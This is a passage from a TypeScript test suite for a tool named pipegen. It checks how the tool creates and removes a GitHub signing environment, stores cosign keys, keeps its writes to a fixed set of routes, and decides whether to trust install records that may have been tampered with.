    expect(w2.g.calls.some((c) => c.route.startsWith('DELETE '))).toBe(false);
    expect(w2.g.repo('o/r').envs.has('pipegen-signing')).toBe(true);
  });

  it('dropRunSigningEnvironment: G-SIGN1-R2 sec M1 an environment that holds a secret or a variable pipegen did not add is kept and listed', async () => {
    const x = (w: World) => ({ clock: { budget: newRateBudget(), sleep: async () => {} }, local: { home: w.home, env: {} }, now: new Date('2026-11-05T12:00:00Z') });
    const file = (w: World) => join(w.home, '.config', 'pipegen', 'records', 'o__r.leftovers.json');
    for (const [what, add] of [
      ['a secret', (e: { stored: Map<string, string>; vars?: Map<string, string> }) => { e.stored.set('TEAM_DEPLOY_NOTE', '2026-11-05T12:00:30Z'); }],
      ['a variable', (e: { stored: Map<string, string>; vars?: Map<string, string> }) => { e.vars = new Map([['REGION', 'eu']]); }],
    ] as const) {
      const w = world();
      const made = await makeRunSigningEnvironment(w.g.octokit(), { owner: 'o', repo: 'r' }, 'main', x(w));
      if (!('env' in made)) throw new Error('expected the environment');
      add(w.g.repo('o/r').envs.get('pipegen-signing') as never);
      const out = await dropRunSigningEnvironment(w.g.octokit(), { owner: 'o', repo: 'r' }, made.env, x(w));
      expect(out, what).toEqual({ left: expect.stringMatching(/holds (TEAM_DEPLOY_NOTE|REGION), which pipegen didn't add.*o__r\.leftovers\.json/s) });
      expect(w.g.calls.some((c) => c.route.startsWith('DELETE ')), what).toBe(false);
      expect(w.g.repo('o/r').envs.has('pipegen-signing'), what).toBe(true);
      expect((JSON.parse(readFileSync(file(w), 'utf8')) as { items: { name: string }[] }).items.map((i) => i.name), what).toEqual(['pipegen-signing']);
    }
    // a list it can't read whole: kept
    const w = world();
    const made = await makeRunSigningEnvironment(w.g.octokit(), { owner: 'o', repo: 'r' }, 'main', x(w));
    if (!('env' in made)) throw new Error('expected the environment');
    w.g.hooks.push((c) => (c.route === `GET /repos/{owner}/{repo}/environments/{environment_name}/${LIST}` ? { status: 200, data: { total_count: 3, [LIST]: [] } } : undefined));
    expect(await dropRunSigningEnvironment(w.g.octokit(), { owner: 'o', repo: 'r' }, made.env, x(w))).toEqual({ left: expect.stringMatching(/couldn't list/) });
    expect(w.g.repo('o/r').envs.has('pipegen-signing')).toBe(true);
  });

  it('dropRunSigningEnvironment: G-SIGN1-R2 spec L2 a delete answering 404 counts as deleted; an entry with no created_at is never deleted', async () => {
    const x = (w: World) => ({ clock: { budget: newRateBudget(), sleep: async () => {} }, local: { home: w.home, env: {} }, now: new Date('2026-11-05T12:00:00Z') });
    const w = world();
    const made = await makeRunSigningEnvironment(w.g.octokit(), { owner: 'o', repo: 'r' }, 'main', x(w));
    if (!('env' in made)) throw new Error('expected the environment');
    w.g.hooks.push((c) => (c.route === 'DELETE /repos/{owner}/{repo}/environments/{environment_name}' ? { status: 404, data: { message: 'Not Found' } } : undefined));
    expect(await dropRunSigningEnvironment(w.g.octokit(), { owner: 'o', repo: 'r' }, made.env, x(w))).toEqual({ dropped: true });
    const w2 = world();
    const m2 = await makeRunSigningEnvironment(w2.g.octokit(), { owner: 'o', repo: 'r' }, 'main', x(w2));
    if (!('env' in m2)) throw new Error('expected the environment');
    const { githubCreatedAt: _gone, ...noAt } = m2.env;
    void _gone;
    expect(await dropRunSigningEnvironment(w2.g.octokit(), { owner: 'o', repo: 'r' }, noAt, x(w2))).toEqual({ left: expect.stringMatching(/not an environment this run made/) });
    expect(w2.g.calls.some((c) => c.route.startsWith('DELETE '))).toBe(false);
    expect(w2.g.repo('o/r').envs.has('pipegen-signing')).toBe(true);
  });

  it('deliver: G-SIGN1-R2 sec I1 a run environment never takes the keep-the-pair path: without the new pair nothing is written; with it the key goes into the new environment', async () => {
    const w = world();
    const first = await firstRun(w, {}, { signingKey: async () => SIGNING }, {}, { signing: { mode: 'key-env', images: [], cosignPubSha256: pubKeySha256(SIGNING.pub) } });
    // the owner deletes the environment (and the key); the run makes a new one
    w.g.repo('o/r').envs.delete('pipegen-signing');
    const made = await makeRunSigningEnvironment(w.g.octokit(), { owner: 'o', repo: 'r' }, 'main', { clock: { budget: newRateBudget(), sleep: async () => {} }, local: { home: w.home, env: {} }, now: new Date('2026-11-05T13:00:00Z') });
    if (!('env' in made)) throw new Error('expected the environment');
    const p = profile();
    const sameKey = { signing: { mode: 'key-env' as const, images: [], cosignPubSha256: pubKeySha256(SIGNING.pub) } };
    const v = () => {
      const vault = new SecretVault();
      vault.set(KEY, KEY_VALUE);
      return vault;
    };
    const before = w.g.calls.length;
    await expect(deliver(w.g.octokit(), p, planDelivery(input(p, first.pin, { signingEnv: made.env }, sameKey)), v(), deps(w))).rejects.toThrow(/needs the key pair/);
    expect(w.g.calls.slice(before).some((c) => !c.route.startsWith('GET '))).toBe(false);
    // with the fresh pair the run now makes: stored in the new environment, the record names the new created_at
    const NEW = { ...SIGNING, pub: cosignPub(9) } as SigningKey;
    const plan = planDelivery(input(p, first.pin, { signingEnv: made.env }, { signing: { mode: 'key-env', images: [], cosignPubSha256: pubKeySha256(NEW.pub) } }));
    expect(previewText(plan)).toMatch(/made earlier in this run/);
    await deliver(w.g.octokit(), p, plan, v(), deps(w, { signingKey: async () => NEW }, { replace: true }));
    const env = w.g.repo('o/r').envs.get('pipegen-signing');
    expect([...(env?.stored.keys() ?? [])].sort()).toEqual(['PIPEGEN_COSIGN_KEY', 'PIPEGEN_COSIGN_PASSWORD']);
    const rec = await record(w, `pipegen/update-${centralProjectName('r')}`) ?? await record(w);
    expect(rec?.environments.find((e) => e.name === 'pipegen-signing')).toMatchObject({ created: true, githubCreatedAt: env?.created_at });
    expect(rec?.cosignPubSha256).toBe(pubKeySha256(NEW.pub));
  });

  it('ghWrite: G-SIGN1-R2 sec M5 the delivery writes environments only for pipegen-signing, and its write list is fixed', async () => {
    const w = world();
    w.g.repo('o/r').envs.set('production', { id: 9, created_at: '2026-01-01T00:00:00Z', wait_timer: 0, prevent_self_review: false, reviewers: [], can_admins_bypass: true, deployment_branch_policy: null, policies: [], stored: new Map() });
    for (const route of ['DELETE /repos/{owner}/{repo}/environments/{environment_name}', 'PUT /repos/{owner}/{repo}/environments/{environment_name}', 'POST /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies']) {
      await expect(ghWrite(w.g.octokit(), route, { owner: 'o', repo: 'r' }, { environment_name: 'production', name: 'main' })).rejects.toThrow(/only the environment pipegen-signing/);
      await expect(ghWrite(w.g.octokit(), route, { owner: 'o', repo: 'r' }, { environment_name: 'Pipegen-Signing', name: 'main' })).rejects.toThrow(/only the environment pipegen-signing/);
    }
    expect(w.g.calls.filter((c) => !c.route.startsWith('GET '))).toEqual([]);
    expect(w.g.repo('o/r').envs.has('production')).toBe(true);
    expect([...DELIVER_WRITE_ROUTES].sort()).toEqual([
      'DELETE /repos/{owner}/{repo}/environments/{environment_name}',
      'PATCH /repos/{owner}/{repo}/git/refs/{ref}',
      'PATCH /repos/{owner}/{repo}/pulls/{pull_number}',
      'POST /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies',
      'POST /repos/{owner}/{repo}/git/commits',
      'POST /repos/{owner}/{repo}/git/refs',
      'POST /repos/{owner}/{repo}/git/trees',
      'POST /repos/{owner}/{repo}/pulls',
      'PUT /repos/{owner}/{repo}/environments/{environment_name}',
    ]);
    expect(() => (DELIVER_WRITE_ROUTES as Set<string>).add('DELETE /repos/{owner}/{repo}')).toThrow();
    expect(() => (DELIVER_WRITE_ROUTES as Set<string>).delete('POST /repos/{owner}/{repo}/pulls')).toThrow();
  });

  it('deliver: G-SIGN1 the environment the run made before assembly is recorded as made by pipegen, not as one that was there', async () => {
    const signing = { signing: { mode: 'key-env' as const, images: [], cosignPubSha256: pubKeySha256(SIGNING.pub) } };
    const w = world();
    const made = await makeRunSigningEnvironment(w.g.octokit(), { owner: 'o', repo: 'r' }, 'main', { clock: { budget: newRateBudget(), sleep: async () => {} }, local: { home: w.home, env: {} }, now: new Date('2026-11-05T12:00:00Z') });
    if (!('env' in made)) throw new Error('expected the environment');
    const before = w.g.calls.length;
    const { res, plan } = await firstRun(w, { signingEnv: made.env }, { signingKey: async () => SIGNING }, {}, signing);
    expect(plan.signingEnv).toEqual(made.env);
    const env = w.g.repo('o/r').envs.get('pipegen-signing');
    expect((await record(w))?.environments).toEqual([{ name: 'pipegen-signing', created: true, githubCreatedAt: env?.created_at, changed: [], branchPolicyIds: env?.policies.map((x) => x.id) }]);
    expect(res.notes.join('\n')).not.toMatch(/was there before pipegen/);
    // read back again before the key is stored, and not written again
    expect(w.g.calls.slice(before).some((c) => c.route === 'GET /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies')).toBe(true);
    expect(w.g.calls.slice(before).some((c) => c.route.includes('/environments/') && !c.route.startsWith('GET ') && !c.route.includes('/secrets/'))).toBe(false);
    expect([...(env?.stored.keys() ?? [])].sort()).toEqual(['PIPEGEN_COSIGN_KEY', 'PIPEGEN_COSIGN_PASSWORD']);
    // the control: without it, the same environment reads as one that was there before pipegen (uninstall would keep it)
    const w2 = world();
    await makeRunSigningEnvironment(w2.g.octokit(), { owner: 'o', repo: 'r' }, 'main', { clock: { budget: newRateBudget(), sleep: async () => {} }, local: { home: w2.home, env: {} }, now: new Date('2026-11-05T12:00:00Z') });
    await firstRun(w2, {}, { signingKey: async () => SIGNING }, {}, signing);
    expect((await record(w2))?.environments[0]).toMatchObject({ name: 'pipegen-signing', created: false });
    // an entry that is not this environment any more (another created_at): pipegen's claim is dropped, the environment reads as there before
    const w3 = world();
    const m3 = await makeRunSigningEnvironment(w3.g.octokit(), { owner: 'o', repo: 'r' }, 'main', { clock: { budget: newRateBudget(), sleep: async () => {} }, local: { home: w3.home, env: {} }, now: new Date('2026-11-05T12:00:00Z') });
    if (!('env' in m3)) throw new Error('expected the environment');
    await firstRun(w3, { signingEnv: { ...m3.env, githubCreatedAt: '2020-01-01T00:00:00Z' } }, { signingKey: async () => SIGNING }, {}, signing);
    expect((await record(w3))?.environments[0]).toMatchObject({ name: 'pipegen-signing', created: false });
    // an entry that doesn't say pipegen made it is not the run's own: the environment reads as there before (its settings kept for uninstall)
    const w4 = world();
    const m4 = await makeRunSigningEnvironment(w4.g.octokit(), { owner: 'o', repo: 'r' }, 'main', { clock: { budget: newRateBudget(), sleep: async () => {} }, local: { home: w4.home, env: {} }, now: new Date('2026-11-05T12:00:00Z') });
    if (!('env' in m4)) throw new Error('expected the environment');
    await firstRun(w4, { signingEnv: { ...m4.env, created: false } }, { signingKey: async () => SIGNING }, {}, signing);
    expect((await record(w4))?.environments[0]).toMatchObject({ name: 'pipegen-signing', created: false, previous: expect.any(Object) });
  });

  it('preview: G-SIGN1 an environment made earlier in this run is said so; the key is still created now', () => {
    const signing = { signing: { mode: 'key-env' as const, images: [], cosignPubSha256: pubKeySha256(SIGNING.pub) } };
    const p = profile();
    const env = { name: 'pipegen-signing', created: true, githubCreatedAt: '2026-11-05T12:00:00Z', changed: [], branchPolicyIds: [1] };
    const text = previewText(planDelivery(input(p, 'c'.repeat(40), { signingEnv: env }, signing)));
    expect(text).toMatch(/made earlier in this run/);
    expect(text).toMatch(/signing key in it/);
    expect(previewText(planDelivery(input(p, 'c'.repeat(40), {}, signing)))).not.toMatch(/made earlier in this run/);
  });

  it('deliver: the signing key pair must be in cosign\'s exact form; the private key goes through its own store path (G11, G10-R1)', async () => {
    const signing = { signing: { mode: 'key-env' as const, images: [], cosignPubSha256: pubKeySha256(SIGNING.pub) } };
    for (const bad of [{ ...SIGNING, key: 'K'.repeat(80) }, { ...SIGNING, key: `${SIGNING.key}trailing\n` }]) {
      const w = world();
      const before = w.g.calls.length;
      const e = await firstRun(w, {}, { signingKey: async () => bad }, {}, signing).then(() => null, (x: unknown) => x) as Error;
      expect(e.message).toMatch(/not a cosign encrypted private key.*stores no key/);
      expect(e.message).not.toContain('KKKK');
      expect(w.g.calls.slice(before).some((c) => c.route.includes('/environments/') && !c.route.startsWith('GET '))).toBe(false);
    }
    // a public key not in cosign's form
    const w2 = world();
    const pub = 'not a key';
    await expect(firstRun(w2, {}, { signingKey: async () => ({ ...SIGNING, pub }) }, {}, { signing: { ...signing.signing, cosignPubSha256: pubKeySha256(pub) } })).rejects.toThrow(/public key that is not in the form cosign writes/);
  });

  it('deliver: applies no ruleset, environment or variable before merge', async () => {
    // amended (S11, N4): except the pipegen-signing environment and its key, which are recorded
    const w = world();
    await firstRun(w, {}, { signingKey: async () => SIGNING }, {}, { signing: { mode: 'key-env', images: [], cosignPubSha256: pubKeySha256(SIGNING.pub) } });
    const writes = w.g.calls.filter((c) => !c.route.startsWith('GET '));
    expect(writes.some((c) => /rulesets|\/protection|actions\/variables|actions\/permissions|\/orgs\//.test(c.route))).toBe(false);
    expect(writes.filter((c) => c.route.includes('/environments/')).every((c) => c.params.environment_name === 'pipegen-signing')).toBe(true);
    const env = w.g.repo('o/r').envs.get('pipegen-signing');
    expect(env?.deployment_branch_policy).toEqual({ protected_branches: false, custom_branch_policies: true });
    expect(env?.policies.map((x) => ({ name: x.name, type: x.type }))).toEqual([{ name: 'main', type: 'branch' }]);
    expect([...(env?.stored.keys() ?? [])].sort()).toEqual(['PIPEGEN_COSIGN_KEY', 'PIPEGEN_COSIGN_PASSWORD']);
    expect((await record(w))?.environments.map((e) => e.name)).toEqual(['pipegen-signing']);
    // the key is stored only after the environment reads back default-branch only, and only when it is the key the workflows check
    const w2 = world();
    w2.g.hooks.push((c) => (c.route === 'GET /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies' ? { status: 200, data: { total_count: 2, branch_policies: [{ id: 1, name: 'main', type: 'branch' }, { id: 2, name: '*', type: 'branch' }] } } : undefined));
    await expect(firstRun(w2, {}, { signingKey: async () => SIGNING }, {}, { signing: { mode: 'key-env', images: [], cosignPubSha256: pubKeySha256(SIGNING.pub) } })).rejects.toThrow(/default branch/);
    expect(w2.g.calls.some((c) => c.route.includes('/environments/{environment_name}/secrets/{secret_name}') && c.route.startsWith('PUT'))).toBe(false);
    const w3 = world();
    await expect(firstRun(w3, {}, { signingKey: async () => ({ ...SIGNING, pub: 'another key' }) }, {}, { signing: { mode: 'key-env', images: [], cosignPubSha256: pubKeySha256(SIGNING.pub) } })).rejects.toThrow(/public key/);
    expect(w3.g.calls.some((c) => c.route.includes('/secrets/{secret_name}') && c.route.startsWith('PUT') && String(nameOf(c)).startsWith('PIPEGEN_COSIGN'))).toBe(false);
  });

  it('deliver: an existing pipegen-signing keeps every setting but its branch rule; one that allows other branches is a stop (G10-R-sec 2)', async () => {
    const signing = { signing: { mode: 'key-env' as const, images: [], cosignPubSha256: pubKeySha256(SIGNING.pub) } };
    const w = world();
    w.g.repo('o/r').envs.set('pipegen-signing', { id: 5, created_at: '2026-01-01T00:00:00Z', wait_timer: 0, prevent_self_review: true, reviewers: [{ type: 'User', id: 9 }], can_admins_bypass: false, deployment_branch_policy: null, policies: [], stored: new Map() });
    const { res } = await firstRun(w, {}, { signingKey: async () => SIGNING }, {}, signing);
    const env = w.g.repo('o/r').envs.get('pipegen-signing');
    expect(env?.can_admins_bypass).toBe(false);
    expect(env?.reviewers).toEqual([{ type: 'User', id: 9 }]);
    expect(env?.prevent_self_review).toBe(true);
    const put = w.g.calls.find((c) => c.route === 'PUT /repos/{owner}/{repo}/environments/{environment_name}');
    expect(put?.params.can_admins_bypass).toBe(false);
    const e = (await record(w))?.environments[0];
    expect(e).toMatchObject({ name: 'pipegen-signing', created: false, githubCreatedAt: '2026-01-01T00:00:00Z', changed: ['deployment_branch_policy', 'branch_policies'] });
    expect(e?.previous).toEqual({ wait_timer: 0, prevent_self_review: true, reviewers: [{ type: 'User', id: 9 }], can_admins_bypass: false, deployment_branch_policy: null, branch_policies: [] });
    expect(trustNotes(res.notes)).toEqual([]);
    // GitHub changes another setting anyway: reported, and recorded as changed (so uninstall restores it)
    const w2 = world();
    w2.g.repo('o/r').envs.set('pipegen-signing', { id: 5, created_at: '2026-01-01T00:00:00Z', wait_timer: 0, prevent_self_review: false, reviewers: [], can_admins_bypass: false, deployment_branch_policy: null, policies: [], stored: new Map() });
    w2.g.hooks.push((c) => { if (c.route === 'PUT /repos/{owner}/{repo}/environments/{environment_name}') c.params.can_admins_bypass = true; return undefined; });
    const r2 = await firstRun(w2, {}, { signingKey: async () => SIGNING }, {}, signing);
    expect(r2.res.notes.join('\n')).toMatch(/can_admins_bypass/);
    expect((await record(w2))?.environments[0]?.changed).toContain('can_admins_bypass');
    // other branch or tag rules: a stop before any write
    const w3 = world();
    w3.g.repo('o/r').envs.set('pipegen-signing', { id: 5, created_at: '2026-01-01T00:00:00Z', wait_timer: 0, prevent_self_review: false, reviewers: [], can_admins_bypass: true, deployment_branch_policy: { protected_branches: false, custom_branch_policies: true }, policies: [{ id: 1, name: 'main', type: 'branch' }, { id: 2, name: 'release/*', type: 'branch' }], stored: new Map() });
    await expect(firstRun(w3, {}, { signingKey: async () => SIGNING }, {}, signing)).rejects.toThrow(/other branches or tags/);
    expect(w3.g.calls.some((c) => c.params.repo === 'r' && !c.route.startsWith('GET '))).toBe(false);
  });

  it('deliver: a record found only on the central PR branch is trusted only when its hash matches the local record file (G10-R-sec, G10-R-sec2)', async () => {
    const upd = `pipegen/update-${centralProjectName('r')}`;
    const pins = new Map<World, string>();
    /** A re-run; `untrusted`: deliverCentral must refuse (it can't show the central files are pipegen's), and the delivery uses the earlier pin. */
    const rerun = async (w: World, untrusted = false): Promise<Awaited<ReturnType<typeof deliver>>> => {
      const p = profile();
      const v = new SecretVault();
      v.set(KEY, KEY_VALUE);
      // N2: the central files are byte-identical to pipegen's, so even an untrusted run isn't stopped there; changed ones would be (I2)
      if (untrusted) {
        expect(await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w))).toMatchObject({ kind: 'pinned' });
        await expect(deliverCentral(w.g.octokit(), p, centralFiles(' # v2'), cdeps(w))).rejects.toThrow(/no install record pipegen trusts/);
      }
      const pin = untrusted ? pins.get(w) as string : (await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w)) as { sha: string }).sha;
      const files = [...centralFiles(), ...appFiles(pin).map((f) => (f.path === 'Dockerfile' ? { ...f, content: 'FROM node:26\n' } : f))];
      return deliver(w.g.octokit(), p, planDelivery(input(p, pin, { files, centralFileList: centralList(w) })), v, deps(w, {}, { replace: true }));
    };
    const setup = async (): Promise<World> => {
      const w = world();
      const p = profile();
      const c = await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w));
      w.g.repo('o/pipelines').rules = [{ type: 'pull_request' }];   // the record goes to the central PR branch only
      pins.set(w, (c as { sha: string }).sha);
      await deliver(w.g.octokit(), p, planDelivery(input(p, (c as { sha: string }).sha)), w.vault, deps(w));
      expect(await record(w)).toBeUndefined();
      return w;
    };
    // the local record file's hash matches: trusted (the earlier sha is kept, pipegen's own secret stays created)
    const w = await setup();
    const res = await rerun(w);
    expect(trustNotes(res.notes)).toEqual([]);
    const r = await record(w, upd);
    expect(r?.files.find((f) => f.path === 'Dockerfile')?.shas).toEqual([gitBlobSha('FROM node:24\n'), gitBlobSha('FROM node:26\n')]);
    expect(r?.secrets.find((s) => s.name === KEY)?.created).toBe(true);
    // the PR body's marker edited away, but the local record file matches: trusted
    const w4 = await setup();
    (w4.g.repo('o/r').pulls[0] as { body: string }).body = 'edited by someone';
    expect(trustNotes((await rerun(w4)).notes)).toEqual([]);
    expect((await record(w4, upd))?.files.find((f) => f.path === 'Dockerfile')?.shas.length).toBe(2);
    // the PR marker is never a trust source (any app writer can edit the body): no local file + a matching marker → untrusted
    const w2 = await setup();
    rmSync(join(w2.home, '.config', 'pipegen', 'records', 'o__r.json'));
    const res2 = await rerun(w2, true);
    expect(res2.notes.join('\n')).toMatch(/can't be checked from this machine/);
    expect((await record(w2, upd))?.files.find((f) => f.path === 'Dockerfile')?.shas).toEqual([gitBlobSha('FROM node:26\n')]);
    // a local file whose hash differs + a matching marker → untrusted
    const w5 = await setup();
    const file = join(w5.home, '.config', 'pipegen', 'records', 'o__r.json');
    writeFileSync(file, JSON.stringify({ ...JSON.parse(readFileSync(file, 'utf8')), recordHash: 'e'.repeat(64) }));
    expect(w5.g.repo('o/r').pulls[0]?.body.split('\n').at(-1)).toMatch(/record-sha256=/);
    expect((await rerun(w5, true)).notes.join('\n')).toMatch(/doesn't match/);
    expect((await record(w5, upd))?.secrets.find((s) => s.name === KEY)).toMatchObject({ created: false, overwritten: true });
    // a record planted on the branch (someone with write on the central repo changed it): claims nothing
    const w3 = await setup();
    const planted = { ...(await record(w3, upd) as NonNullable<Awaited<ReturnType<typeof record>>>) };
    planted.files.push({ repo: 'app', path: 'README.md', part: 'docs', shas: [gitBlobSha('hi\n')] });
    w3.g.commitOn('o/pipelines', upd, { [recordPath('r')]: JSON.stringify(planted) });
    const res3 = await rerun(w3, true);
    expect(res3.notes.join('\n')).toMatch(/central pull request branch.*doesn't match/i);
    const r3 = await record(w3, upd);
    expect(r3?.files.some((f) => f.path === 'README.md')).toBe(false);
    expect(r3?.files.find((f) => f.path === 'Dockerfile')?.shas).toEqual([gitBlobSha('FROM node:26\n')]);
    expect(r3?.secrets.find((s) => s.name === KEY)).toMatchObject({ created: false, overwritten: true });
  });

  it('deliver: vault wiped after delivery', async () => {
    const w = world();
    await firstRun(w);
    expect(w.vault.names()).toEqual([]);
    // also when the delivery stops
    const w2 = world({ appPrivate: false, centralPrivate: false });
    const p = profile({ private: false });
    await expect(deliver(w2.g.octokit(), p, planDelivery(input(p, null)), w2.vault, deps(w2))).rejects.toBeInstanceOf(DeliverError);
    expect(w2.vault.names()).toEqual([]);
  });

  it('deliver: storeSecrets uses the rate clock', async () => {
    const w = world();
    let limited = false;
    w.g.hooks.push((c) => {
      if (!limited && c.route === 'PUT /repos/{owner}/{repo}/actions/secrets/{secret_name}') { limited = true; return { status: 429, headers: { 'retry-after': '2' } }; }
      return undefined;
    });
    const slept: number[] = [];
    const budget = newRateBudget(120_000);
    await firstRun(w, {}, { clock: { budget, sleep: async (ms) => { slept.push(ms); } } });
    expect(limited).toBe(true);
    expect(slept).toEqual([3000]);   // retry-after 2 s plus the reset margin
    expect(budget.remainingMs).toBe(117_000);
    expect(w.g.repo('o/r').stored.has(KEY)).toBe(true);
  });
});

describe('G10 fix round 1 (review-G10, ruling G10-R2)', () => {
  const upd = `pipegen/update-${centralProjectName('r')}`;
  const localFile = (w: World): string => join(w.home, '.config', 'pipegen', 'records', 'o__r.json');
  const N_VALUE = 'n'.repeat(30);
  /** A new vault with the app key (and `names`, each holding N_VALUE). */
  function fresh(...names: string[]): SecretVault {
    const v = new SecretVault();
    v.set(KEY, KEY_VALUE);
    for (const n of names) v.set(n, N_VALUE);
    return v;
  }
  type Rec = NonNullable<Awaited<ReturnType<typeof record>>>;

  it('fix 1: a record on the central default branch that nothing vouches for, before finish, is claimed from nothing (I1, A4)', async () => {
    const w = world();
    const first = await firstRun(w);
    const planted = structuredClone(await record(w) as Rec);
    planted.files.push({ repo: 'app', path: 'README.md', part: 'docs', shas: [gitBlobSha('hi\n')] });
    const co = planted.edits.find((e) => e.path === 'CODEOWNERS') as { originalSha: string | null };
    co.originalSha = 'a'.repeat(40);
    planted.secrets.push({ name: 'PROD_DB', scope: 'repo', created: true, githubCreatedAt: '2025-01-01T00:00:00Z' });
    w.g.commitOn('o/pipelines', 'main', { [recordPath('r')]: JSON.stringify(planted) });
    const p = profile();
    // the central step can't show its files are pipegen's any more: a stop, nothing written
    const before = w.g.calls.length;
    await expect(deliverCentral(w.g.octokit(), p, centralFiles(' # v2'), cdeps(w))).rejects.toThrow(/no install record pipegen trusts/);
    expect(w.g.calls.slice(before).filter((c) => !c.route.startsWith('GET '))).toEqual([]);
    const res = await deliver(w.g.octokit(), p, planDelivery(input(p, first.pin)), fresh(), deps(w, {}, { replace: true }));
    expect(res.notes.join('\n')).toMatch(/default branch main of o\/pipelines doesn't match the hash in this machine's local record file.*claims nothing/);
    const after = await record(w, upd) as Rec;
    expect(after.files.some((f) => f.path === 'README.md')).toBe(false);
    expect(after.edits.find((e) => e.path === 'CODEOWNERS')?.originalSha).toBe(gitBlobSha(CO_ORIG));
    expect(after.secrets.some((s) => s.name === 'PROD_DB')).toBe(false);
    // what pipegen vouches for next holds only what this run proved
    expect(JSON.parse(readFileSync(localFile(w), 'utf8')).recordHash).toBe(recordHash(after));
  });

  it('fix 1: with no local record file, the default-branch record is trusted only when the user types the repo name (G10-R-sec6)', async () => {
    const make = async (): Promise<World> => {
      const w = world();
      await firstRun(w);
      rmSync(localFile(w));
      return w;
    };
    const p = profile();
    const trustQ = (w: World): string[] => w.asked.filter((q) => /Type o\/r to trust exactly these entries/.test(q));
    // typed correctly: trusted, and vouched into the local file (no second question in the same run)
    const w = await make();
    const c = await deliverCentral(w.g.octokit(), p, centralFiles(' # v2'), cdeps(w, 'o/r'));
    expect(c.kind).toBe('central-pr');
    expect(trustQ(w).length).toBe(1);
    expect(trustQ(w)[0]).toMatch(/files: .*Dockerfile/);
    expect(trustQ(w)[0]).toMatch(new RegExp(`${['sec', 'rets'].join('')}: .*${FP}`));
    expect(JSON.parse(readFileSync(localFile(w), 'utf8')).recordHash).toBe(recordHash(await record(w) as Rec));
    await deliverCentral(w.g.octokit(), p, centralFiles(' # v3'), cdeps(w, 'o/r'));
    expect(trustQ(w).length).toBe(1);
    // wrong text, a non-interactive run (--yes, CI), or no terminal: untrusted, and nothing vouched
    for (const how of ['wrong', 'non-interactive', 'no terminal'] as const) {
      const w2 = await make();
      const d2 = how === 'wrong' ? cdeps(w2, 'o/other') : how === 'no terminal' ? { ...cdeps(w2), io: io(w2), interactive: true } : { ...cdeps(w2, 'o/r'), interactive: false };
      await expect(deliverCentral(w2.g.octokit(), p, centralFiles(' # v2'), d2), how).rejects.toThrow(/can't be checked from this machine/);
      expect(() => readFileSync(localFile(w2)), how).toThrow();
    }
    // the typed name is matched without letter case or spaces around it
    const w4 = await make();
    expect((await deliverCentral(w4.g.octokit(), p, centralFiles(' # v2'), cdeps(w4, '  O/R  '))).kind).toBe('central-pr');
  });

  it('fix 1: the trust question lists every entry the record claims, adopted ones tagged; over the cap it isn\'t asked (G10-R-sec7)', async () => {
    const p = profile();
    const make = async (edit: (r: Rec) => void): Promise<World> => {
      const w = world();
      await firstRun(w);
      const r = structuredClone(await record(w) as Rec);
      edit(r);
      w.g.commitOn('o/pipelines', 'main', { [recordPath('r')]: JSON.stringify(r) });
      rmSync(localFile(w));
      return w;
    };
    // every name in the record is in the question, the adopted file tagged
    const w = await make((r) => {
      r.files.push({ repo: 'app', path: 'docs/adopted.md', part: 'docs', shas: [gitBlobSha('x\n')], adopted: true });
      r.variables.push({ name: 'PIPEGEN_BLOCK_FROM', scope: 'repo', created: true });
      r.rulesets.push({ kind: 'gate', id: 4, name: 'pipegen', githubCreatedAt: '2026-11-06T00:00:00Z' });
    });
    await deliverCentral(w.g.octokit(), p, centralFiles(' # v2'), cdeps(w, 'o/r'));
    const q = w.asked.find((x) => /to trust exactly these entries/.test(x)) as string;
    const r = await record(w) as Rec;
    for (const f of r.files) expect(q, f.path).toContain(f.path);
    expect(q).not.toMatch(/edits:/);   // G10-R4: edits are never trusted by typing, so they aren't offered
    for (const x of [...r.secrets, ...r.variables, ...r.environments, ...r.rulesets]) expect(q, x.name).toContain(x.name);
    expect(q).toContain('docs/adopted.md (adopted)');
    // more entries than the cap: no question, untrusted, and said so
    const big = await make((r) => { for (let i = 0; i < 210; i++) r.files.push({ repo: 'app', path: `gen/f${i}.txt`, part: 'docs', shas: [gitBlobSha(`${i}\n`)] }); });
    await expect(deliverCentral(big.g.octokit(), p, centralFiles(' # v2'), cdeps(big, 'o/r'))).rejects.toThrow(/more than 200 entries/);
    expect(big.asked.filter((x) => /to trust exactly these entries/.test(x))).toEqual([]);
  });

  it('fix 1: a record trusted by typing grants ownership only for the entries the question listed (G10-R-sec8)', async () => {
    const w = world();
    await firstRun(w);
    const r = structuredClone(await record(w) as Rec);
    r.orgRuleset = { org: 'o', id: 11, name: 'pipegen-required--r', githubCreatedAt: '2026-11-06T00:00:00Z', pinnedSha: 'a'.repeat(40) };
    r.classicProtection = { branch: 'main', previous: null };
    r.repoSettings = { shaPinningRequired: { previous: false } };
    r.central = { repoId: 99, createdByPipegen: true, rulesetId: 12, codeowners: { path: '.github/CODEOWNERS', created: true }, actionsAccess: { previous: 'none' } };
    r.scratch = { repoId: 98, createdByPipegen: true };
    r.environments = [{ name: 'pipegen-signing', created: true, githubCreatedAt: '2026-11-06T00:00:00Z', changed: ['deployment_branch_policy'], branchPolicyIds: [5] }];
    w.g.commitOn('o/pipelines', 'main', { [recordPath('r')]: JSON.stringify(r) });
    rmSync(localFile(w));
    const view = confirmView(r);
    if (!('view' in view)) throw new Error('refused');
    for (const k of ['orgRuleset', 'classicProtection', 'repoSettings', 'central', 'scratch'] as const) expect(view.view[k], k).toBeUndefined();
    expect(view.view.environments).toEqual([{ name: 'pipegen-signing', created: true, githubCreatedAt: '2026-11-06T00:00:00Z', changed: [], branchPolicyIds: [] }]);
    expect(view.view.files).toEqual(r.files);
    // the delivery built on it carries none of the unlisted claims (and the next run, through the local file, gets the same view)
    const p = profile();
    await deliverCentral(w.g.octokit(), p, centralFiles(' # v2'), cdeps(w, 'o/r'));
    expect(JSON.parse(readFileSync(localFile(w), 'utf8'))).toMatchObject({ recordHash: recordHash(r), typed: true });
    w.g.repo('o/pipelines').refs.set('heads/main', w.g.head('o/pipelines', upd));   // merge the central PR
    const pin = (await deliverCentral(w.g.octokit(), p, centralFiles(' # v2'), cdeps(w)) as { sha: string }).sha;
